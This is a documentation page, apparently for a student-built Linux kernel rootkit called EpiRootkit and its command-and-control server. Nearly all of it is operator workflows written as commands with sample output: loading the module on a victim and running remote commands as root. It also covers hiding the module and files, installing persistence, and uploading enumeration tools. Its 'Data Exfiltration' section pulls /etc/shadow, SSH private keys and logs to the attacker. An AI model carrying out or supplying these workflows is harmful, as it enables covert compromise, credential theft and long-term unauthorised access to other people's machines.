---
title: "Usage Guide"
description: "Comprehensive usage scenarios and workflows"
icon: "menu_book"
date: "2025-05-25T00:00:00+01:00"
lastmod: "2025-05-25T16:00:00+01:00"
draft: false
toc: true
weight: 304
---

# Usage Guide

Complete workflows for the EpiRootkit C2 server.

## Quick Start

### 1. Start C2 Server
```bash
cd attacking_program
pnpm start
# ✓ Server started on port 4444
# ✓ Web interface started on port 3000
```

### 2. Install Rootkit (Victim)
```bash
sudo insmod epirootkit.ko
# C2 server shows: ✓ Client-1 Connected
```

### 3. Authenticate
```bash
auth Client-1 password
# ✓ [2025-05-25 16:13:30] Authenticated
# SUCCESS: Authentication successful
```

## Basic Workflows

### Client Management
```bash
# List clients
ls
# • Client-1 - AUTHENTICATED - Last seen: 6:13:29 PM
# • Client-2 - UNAUTHENTICATED - Last seen: 6:10:15 PM

# Check status
status Client-1
# EpiRootkit Status:
# Version: 1.0.0
# Authentication: YES
# Module Hidden: YES
# Persistence: ENABLED

# Monitor connection
keepalive Client-1
# Last ping: 2025-05-25 16:14:00
# Connection: STABLE
```

### Command Execution
```bash
# System reconnaissance
exec Client-1 whoami
# Exit code: 0
# Output: root

exec Client-1 uname -a
# Linux victim 5.4.0-74-generic #83-Ubuntu x86_64 GNU/Linux

exec Client-1 ps aux | head -5
# USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
# root         1  0.0  0.1 225468  9876 ?        Ss   15:00   0:01 /sbin/init

# Network information
exec Client-1 ip addr show
exec Client-1 netstat -tuln
```

### File Transfer
```bash
# Upload files
upload Client-1 ./script.sh /tmp/script.sh
# ✓ File uploaded successfully (512 bytes)

exec Client-1 chmod +x /tmp/script.sh
exec Client-1 /tmp/script.sh

# Download files
download Client-1 /etc/passwd ./passwd
# ✓ File downloaded successfully (2048 bytes)

download Client-1 /home/user/.ssh/id_rsa ./keys/
# ✓ File downloaded successfully (1679 bytes)
```

## Advanced Workflows

### Persistence Setup
```bash
# Install all persistence mechanisms
persist Client-1 install
# SUCCESS: All persistence mechanisms installed

# Test persistence (victim reboots)
exec Client-1 reboot
# Wait for reconnection...

ls
# • Client-1 - UNAUTHENTICATED - Last seen: Just now

auth Client-1 password
status Client-1
# Persistence: ENABLED (survived reboot)
```

### Stealth Operations
```bash
# Check current stealth status
status Client-1
# Module Hidden: YES
# File Hiding: YES

# Test module hiding
exec Client-1 lsmod | grep epirootkit
# (no output - module hidden)

# Test file hiding
exec Client-1 touch /tmp/epirootkit_test
exec Client-1 ls /tmp/ | grep epirootkit
# (no output - file hidden)

# But file still accessible
exec Client-1 cat /tmp/epirootkit_test
# (works normally)
```

### Configuration Management
```bash
# Interactive configuration
config Client-1
# ┌─ Configuration - Client-1
#   [X] Module Hiding (Click to disable)
#   [X] File Hiding (Click to disable)
#   [X] Persistence (Click to disable)

# Direct commands
hide_module Client-1
# SUCCESS: Module hidden

unhide_module Client-1
# SUCCESS: Module visible

hide_files Client-1
# SUCCESS: File hiding enabled
```

## Real-World Scenarios

### Initial Compromise
```bash
# 1. Gain foothold
auth Client-1 password

# 2. Reconnaissance
exec Client-1 id
exec Client-1 hostname
exec Client-1 cat /etc/os-release

# 3. Enable stealth
hide_module Client-1
hide_files Client-1

# 4. Establish persistence
persist Client-1 install
```

### Data Exfiltration
```bash
# System information
download Client-1 /etc/passwd
download Client-1 /etc/shadow
download Client-1 /etc/hosts

# User data
download Client-1 /home/user/.bash_history
download Client-1 /home/user/.ssh/known_hosts

# Log files
download Client-1 /var/log/auth.log
download Client-1 /var/log/syslog
```

### Lateral Movement Preparation
```bash
# Network reconnaissance
exec Client-1 ip route show
exec Client-1 arp -a
exec Client-1 ss -tulpn

# Upload tools
upload Client-1 ./tools/nmap /tmp/scanner
upload Client-1 ./tools/linpeas.sh /tmp/enum.sh
exec Client-1 chmod +x /tmp/scanner /tmp/enum.sh

# Execute reconnaissance
exec Client-1 /tmp/enum.sh > /tmp/results.txt
download Client-1 /tmp/results.txt ./recon/
```

### Persistence Testing
```bash
# Before reboot
status Client-1
persist Client-1 install

# Simulate reboot
exec Client-1 sudo systemctl reboot
# Connection lost...

# After victim reboots (auto-reconnect)
ls
# • Client-1 - UNAUTHENTICATED - Last seen: Just now

auth Client-1 password
status Client-1
# Persistence: ENABLED ✓
```

## Error Handling

### Common Issues
```bash
# Client not found
auth Client-999 password
# ERROR: Client not found

# Authentication failed
auth Client-1 wrongpass
# ERROR: Authentication failed

# Rate limiting
auth Client-1 wrong1
auth Client-1 wrong2
# ... (after 5 attempts)
# ERROR: Rate limited. Try again in 60 seconds

# Command on unauthenticated client
exec Client-1 whoami
# ERROR: Client not authenticated
```

### Connection Issues
```bash
# Check connection status
keepalive Client-1
# Failed pings: 3
# Connection: UNSTABLE

# Client disconnected
exec Client-1 whoami
# ERROR: Client disconnected

# Network timeout
download Client-1 /huge/file.bin
# ERROR: Network timeout
```

